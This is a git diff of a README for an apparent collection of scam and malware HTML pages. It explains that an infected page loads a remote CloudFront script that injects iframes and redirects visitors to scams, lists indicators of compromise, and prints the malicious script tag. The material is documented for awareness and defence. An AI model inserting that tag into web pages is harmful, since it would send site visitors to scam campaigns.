@@ -1,4 +1,21 @@
 # ddos-guard-scam-source+ other scam sources
+
+## Example: Infected HTML File
+
+This file (`malwerverisiting_infected file test.html`) shows how attackers weaponize a simple page:
+
+- The HTML itself looks normal.
+- A remote `<script>` tag loads malicious code from CloudFront.
+- That code injects iframes and redirects visitors into scam campaigns.
+
+### Indicators of Compromise (IOCs)
+- Domain: `d1owuvqs9tkert.cloudfront.net`
+- Parameter: `vuwod=1252956`
+- Behavior: iframe injection + scam redirects
+
+⚠️ Important: The HTML file itself is not dangerous until the external script is loaded. Always review `<script src="...">` tags in your site for unknown domains.
+
+
 WARNING: this is a malware scam i got from a sus link
 
 - This page includes normalize.css (MIT license), which is legitimate, but here it’s bundled into a scam opera gx page. (https://github.com/benjaminlourencoduarte-svg/html-malware-database/blob/main/fake%20opera%20scam%202.html)
@@ -17,19 +34,3 @@ Malicious HTML often hides `<script>` tags that load external payloads (for exam
 Example of an infected tag:
 ```html
 <script src="https://d1owuvqs9tkert.cloudfront.net/?vuwod=1252956"></script>
-
-## Example: Infected HTML File
-
-This file (`malwerverisiting_infected file test.html`) shows how attackers weaponize a simple page:
-
-- The HTML itself looks normal.
-- A remote `<script>` tag loads malicious code from CloudFront.
-- That code injects iframes and redirects visitors into scam campaigns.
-
-### Indicators of Compromise (IOCs)
-- Domain: `d1owuvqs9tkert.cloudfront.net`
-- Parameter: `vuwod=1252956`
-- Behavior: iframe injection + scam redirects
-
-⚠️ Important: The HTML file itself is not dangerous until the external script is loaded. Always review `<script src="...">` tags in your site for unknown domains.
-
